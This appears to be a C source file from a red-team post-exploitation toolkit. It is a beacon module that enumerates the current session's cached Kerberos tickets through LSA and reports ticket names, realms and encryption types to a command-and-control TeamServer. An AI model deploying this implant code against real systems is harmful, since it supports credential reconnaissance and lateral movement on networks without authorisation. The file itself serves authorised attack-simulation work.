/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( LsaLookupAuthenticationPackage );
	D_API( LsaCallAuthenticationPackage );
	D_API( LsaDeregisterLogonProcess );
	D_API( LsaFreeReturnBuffer );
	D_API( LsaConnectUntrusted );
	D_API( RtlInitAnsiString );
	D_API( RtlAllocateHeap );
	D_API( RtlFreeHeap );
} API ;

/*!
 *
 * Purpose:
 *
 * Queries all the available tickets for the current
 * logon session. Enumerates through each one, and 
 * prints information about the ticket back to TS.
 *
!*/
VOID KrbListGo( _In_ PVOID Argv, _In_ INT Argc )
{
	API					Api;
	ANSI_STRING				Ani;

	ULONG					Kid = 0;
	ULONG					RLn = 0;
	NTSTATUS				Pst = STATUS_SUCCESS;

	HANDLE					Lsa = NULL;
	HANDLE					S32 = NULL;
	HANDLE					Ntl = NULL;
	PBUFFER					Out = NULL;
	PKERB_QUERY_TKT_CACHE_REQUEST		Kcr = NULL;
	PKERB_QUERY_TKT_CACHE_EX_RESPONSE	Res = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );

	/* Reference ntdll.dll */
	Ntl = LoadLibraryA( "ntdll.dll" );

	if ( Ntl != NULL ) {
		Api.RtlInitAnsiString = C_PTR( GetProcAddress( Ntl, "RtlInitAnsiString" ) );
		Api.RtlAllocateHeap   = C_PTR( GetProcAddress( Ntl, "RtlAllocateHeap" ) );
		Api.RtlFreeHeap       = C_PTR( GetProcAddress( Ntl, "RtlFreeHeap" ) );

		/* Reference secur32.dll */
		S32 = LoadLibraryA( "secur32.dll" );

		if ( S32 != NULL ) {

			/* Build Stack API Table */
			Api.LsaLookupAuthenticationPackage = C_PTR( GetProcAddress( S32, "LsaLookupAuthenticationPackage" ) );
			Api.LsaCallAuthenticationPackage   = C_PTR( GetProcAddress( S32, "LsaCallAuthenticationPackage" ) );
			Api.LsaDeregisterLogonProcess      = C_PTR( GetProcAddress( S32, "LsaDeregisterLogonProcess" ) );
			Api.LsaFreeReturnBuffer            = C_PTR( GetProcAddress( S32, "LsaFreeReturnBuffer" ) );
			Api.LsaConnectUntrusted            = C_PTR( GetProcAddress( S32, "LsaConnectUntrusted" ) );

			/* Connecting to LSA without any information */
			if ( NT_SUCCESS( Api.LsaConnectUntrusted( &Lsa ) ) ) {

				/* Initialize the information about the name */
				Api.RtlInitAnsiString( &Ani, MICROSOFT_KERBEROS_NAME_A );

				/* Lookup the authentication package */
				if ( NT_SUCCESS( Api.LsaLookupAuthenticationPackage( Lsa, &Ani, &Kid ) ) ) {
					/* Allocate a cache request buffer */
					if ( ( Kcr = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( KERB_QUERY_TKT_CACHE_REQUEST ) ) ) != NULL ) {

						/* Ask to acquire a list of tickets */
						Kcr->MessageType = KerbQueryTicketCacheExMessage; 

						/* Query the tickets from Lsa */
						if ( NT_SUCCESS( Api.LsaCallAuthenticationPackage( Lsa, Kid, Kcr, sizeof( KERB_QUERY_TKT_CACHE_REQUEST ), &Res, &RLn, &Pst ) ) ) {
							if ( NT_SUCCESS( Pst ) ) {
								/* Create an output buffer for printing */
								if ( ( Out = BufferCreate() ) != NULL ) {

									BufferPrintf( Out, "Cached Tickets: (%i)\n\n", Res->CountOfTickets );

									/* Enumerate each individual ticket */
									for ( INT Idx = 0 ; Idx < Res->CountOfTickets ; ++Idx ) {
										BufferPrintf( Out, "%i>", Idx );
										BufferPrintf( Out, "	Server Name	: %wZ @ %wZ\n", Res->Tickets[ Idx ].ServerName, Res->Tickets[ Idx ].ServerRealm );
										BufferPrintf( Out, "	Client Name	: %wZ @ %wZ\n", Res->Tickets[ Idx ].ClientName, Res->Tickets[ Idx ].ClientRealm );
										BufferPrintf( Out, "	Encryption	: %s\n", KrbUtilEncryptionType( Res->Tickets[ Idx ].EncryptionType ) );
										BufferPrintf( Out, "\n" );
									};

									/* Print the information back to the TeamServer */
									BeaconOutput( CALLBACK_OUTPUT, Out->Buffer, Out->Length );

									/* Free the buffer */
									Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out->Buffer );
									Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out );
									Out = NULL;
								};
							};
							/* Free the return buffer */
							Api.LsaFreeReturnBuffer( Res );
						};

						/* Free the memory from the cache request */
						Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Kcr );
					};
				};
				/* Disconnect from Lsa */
				Api.LsaDeregisterLogonProcess( Lsa );
			};
			/* Dereference */
			FreeLibrary( S32 );
		};

		/* Dereference */
		FreeLibrary( Ntl );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
};
